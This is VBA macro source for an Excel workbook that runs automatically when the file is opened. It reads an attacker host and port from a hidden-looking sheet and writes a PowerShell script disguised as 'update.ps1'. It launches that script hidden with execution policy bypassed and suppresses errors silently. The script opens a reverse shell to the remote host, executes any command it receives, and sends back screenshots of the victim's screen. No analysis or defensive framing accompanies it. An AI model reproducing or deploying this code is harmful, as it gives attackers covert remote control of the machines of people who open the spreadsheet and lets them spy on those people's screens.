' Paste this code in the Excel VBA Editor (Alt+F11)
' This will run automatically when the Excel file is opened

Private Sub Workbook_Open()
    On Error GoTo ErrorHandler
    Call ExecutePowerShellScript
    Exit Sub
ErrorHandler:
    ' Silent error handling
    Exit Sub
End Sub

Sub ExecutePowerShellScript()
    Dim wsh As Object
    Dim waitOnReturn As Boolean
    Dim windowStyle As Integer
    Dim tempFile As String
    Dim fileNumber As Integer
    Dim junkSheet As Worksheet
    
    ' === CONFIGURATION FROM "JUNK" SHEET ===
    Dim targetIP As String
    Dim targetPort As String
    
    On Error Resume Next
    Set junkSheet = ThisWorkbook.Sheets("history.")
    If junkSheet Is Nothing Then
        targetIP = "127.0.0.1"
        targetPort = "4444"
    Else
        targetIP = Trim(junkSheet.Range("A30").Value)
        targetPort = Trim(junkSheet.Range("A31").Value)
        If targetIP = "" Then targetIP = "127.0.0.1"
        If targetPort = "" Then targetPort = "4444"
    End If
    On Error GoTo 0
    ' === END CONFIGURATION ===
    
    Application.DisplayAlerts = False
    Application.EnableEvents = False
    Application.ScreenUpdating = False
    
    tempFile = Environ("TEMP") & "\update.ps1"
    fileNumber = FreeFile
    
    Open tempFile For Output As #fileNumber
    Print #fileNumber, CreatePowerShellScript(targetIP, targetPort, tempFile)
    Close #fileNumber
    
    Set wsh = CreateObject("WScript.Shell")
    waitOnReturn = False
    windowStyle = 0
    
    wsh.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & tempFile & """", windowStyle, waitOnReturn
    
    Application.ScreenUpdating = True
    Application.EnableEvents = True
    Application.DisplayAlerts = True
End Sub

Function CreatePowerShellScript(ip As String, port As String, scriptPath As String) As String
    Dim script As String
    
    script = "function Take-Screenshot {"
    script = script & "Add-Type -AssemblyName System.Windows.Forms;"
    script = script & "Add-Type -AssemblyName System.Drawing;"
    script = script & "$Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
    script = script & "$Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height;"
    script = script & "$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap);"
    script = script & "$Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size);"
    script = script & "$memoryStream = New-Object System.IO.MemoryStream;"
    script = script & "$Bitmap.Save($memoryStream, [System.Drawing.Imaging.ImageFormat]::Png);"
    script = script & "$imageBytes = $memoryStream.ToArray();"
    script = script & "$base64Image = [System.Convert]::ToBase64String($imageBytes);"
    script = script & "$Graphics.Dispose();"
    script = script & "$Bitmap.Dispose();"
    script = script & "$memoryStream.Dispose();"
    script = script & "return $base64Image"
    script = script & "}"
    
    script = script & "$ip = '" & ip & "';"
    script = script & "$port = " & port & ";"
    script = script & "$client = New-Object System.Net.Sockets.TCPClient($ip, $port);"
    script = script & "$stream = $client.GetStream();"
    script = script & "$writer = New-Object System.IO.StreamWriter($stream);"
    script = script & "$reader = New-Object System.IO.StreamReader($stream);"
    script = script & "$writer.AutoFlush = $true;"
    script = script & "$writer.Write('C:\> ');"
    script = script & "while($client.Connected) {"
    script = script & "$command = $reader.ReadLine();"
    script = script & "if ($command -eq 'exit') { break };"
    script = script & "if ($command -eq 'snippet') {"
    script = script & "$screenshot = Take-Screenshot;"
    script = script & "$writer.WriteLine('SCREENSHOT_START');"
    script = script & "$writer.WriteLine($screenshot);"
    script = script & "$writer.WriteLine('SCREENSHOT_END');"
    script = script & "} else {"
    script = script & "try {"
    script = script & "$output = iex $command 2>&1 | Out-String;"
    script = script & "$writer.Write($output);"
    script = script & "} catch {"
    script = script & "$writer.WriteLine('Error executing command');"
    script = script & "}"
    script = script & "}"
    script = script & "$writer.Write('C:\> ');"
    script = script & "}"
    script = script & "$reader.Close();"
    script = script & "$writer.Close();"
    script = script & "$stream.Close();"
    script = script & "$client.Close()"
    
    CreatePowerShellScript = script
End Function